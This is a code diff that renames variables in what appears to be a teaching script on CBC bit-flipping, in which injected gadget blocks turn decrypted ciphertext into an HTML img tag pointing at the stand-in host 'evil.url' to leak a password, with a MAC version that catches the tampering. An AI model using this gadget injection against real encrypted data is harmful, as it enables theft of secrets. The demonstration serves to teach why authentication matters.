@@ -5,8 +5,8 @@ import {injectGadget} from "./cbc-gadgets.js";
 import {appendMac, checkMacThenReturnPayload} from "./encryptWithMac.js";
 
 const message = Buffer.from('Your password is:Se@ld-i5-great')
-const gadget0 = Buffer.from(' <img ignore= " ')
-const gadget1 = Buffer.from(' " src=evil.url/')
+const g0 = Buffer.from(' <img ignore= " ')
+const g1 = Buffer.from(' " src=evil.url/')
 
 const firstBlock = Buffer.from('Your password is')
 
@@ -39,7 +39,7 @@ const encryptWithoutMacInjectGadgetThenDecrypt = (message: Buffer, firstBlock: B
     console.log('decryptedMessage:', decryptedMessage)
 }
 
-encryptWithoutMacInjectGadgetThenDecrypt(message, firstBlock, gadget0, gadget1)
+encryptWithoutMacInjectGadgetThenDecrypt(message, firstBlock, g0, g1)
 
 /**
  * Same scenario as before, but Alice and Bob now use a symmetric scheme with a MAC which allows Bob to detect the fact
@@ -75,5 +75,5 @@ const encryptWithMacInjectGadgetThenDecrypt = (message: Buffer, firstBlock: Buff
     }
 }
 
-encryptWithMacInjectGadgetThenDecrypt(message, firstBlock, gadget0, gadget1)
+encryptWithMacInjectGadgetThenDecrypt(message, firstBlock, g0, g1)
 
